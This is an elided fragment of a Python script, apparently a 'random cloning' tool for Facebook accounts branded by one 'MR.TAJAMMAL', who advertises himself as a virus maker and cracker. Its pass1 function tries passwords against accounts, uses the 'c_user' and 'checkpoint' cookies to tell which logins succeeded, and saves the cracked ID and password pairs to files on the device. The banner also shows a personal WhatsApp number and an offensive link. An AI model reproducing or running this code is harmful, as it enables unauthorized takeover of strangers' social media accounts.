...
try:
    ...
    print(' WELCOME TO MR.TAJAMMAL RANDOM CLONING SYSTEM')
...
WHATSAPP VIRUS MAKER,CODDER,CLONNER,MODDER,CRACKER
\033[1;97m====================================================
...
\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+923363698371
...
def main():
    ...
    print(f"\033[1;97m[03] \033[1;92mFOLLOW ME ON FACEBOOK")
    ...
    if adi in ["1","01"]:
    	...
    	os.system("xdg-open https://www.facebook.com/kia.kro.gay.link.ka")
    elif adi in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/TAJAMMAL OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/TAJAMMAL CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mTAJAMMAL OK😎\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/TAJAMMAL OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mTAJAMMAL CP🥺\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                    open('/sdcard/TAJAMMAL CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
